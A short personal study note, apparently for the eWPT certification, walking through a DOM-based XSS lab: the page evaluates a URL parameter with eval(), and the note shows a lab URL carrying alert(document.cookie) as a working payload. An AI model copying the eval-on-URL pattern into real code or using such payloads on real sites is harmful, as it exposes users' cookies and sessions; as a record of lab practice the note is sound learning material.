2025-06-23 18:28

Status:

Tags: [[eWPT]] [[XSS Attacks]]
###### Prerequisites: 
# DOM BASED XSS

in the url
```
http://192.99.139.3/lab/webapp/jfp/dom?statement=10+10
```
it parsing the numbers to eval to show result in website
```JavaScript
 <script>

          var statement = document.URL.split("statement=")[1];

          document.getElementById("result").innerHTML = eval(statement);

      </script>

```
so i just altered the url to show cookie

```
http://192.99.139.3/lab/webapp/jfp/dom?statement=alert(document.cookie)
```
and it worked!